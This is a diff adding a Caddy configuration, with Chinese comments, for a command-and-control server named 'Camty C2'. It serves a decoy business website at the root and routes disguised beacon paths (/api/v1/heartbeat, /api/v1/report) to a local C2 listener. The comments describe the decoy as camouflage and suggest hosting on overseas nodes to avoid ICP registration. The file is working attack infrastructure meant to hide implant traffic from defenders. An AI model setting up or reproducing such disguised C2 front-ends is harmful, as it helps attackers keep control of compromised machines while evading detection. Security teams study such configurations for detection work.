@@ -1,0 +1,19 @@
+# Camty C2 域名形态（推荐）：Caddy 443 TLS 终结 + Let's Encrypt
+# 前提：一个域名指向本机（华为云国内节点绑 443 需 ICP 夺案——不备案选香港/海外节点，
+# 或用非标端口形态见 README）。
+#
+# 安装：apt install -y caddy && 覆盖 /etc/caddy/Caddyfile && systemctl reload caddy
+
+c2.example.com {
+	# 伪装面：根路径放正常业务静态页（/opt/camty/c2/deploy/mask-site/）
+	root * /opt/camty/c2/deploy/mask-site
+	file_server
+
+	# beacon 伪装路由 → 本机 C2（127.0.0.1:8443）
+	handle /api/v1/heartbeat {
+		reverse_proxy 127.0.0.1:8443
+	}
+	handle /api/v1/report {
+		reverse_proxy 127.0.0.1:8443
+	}
+}
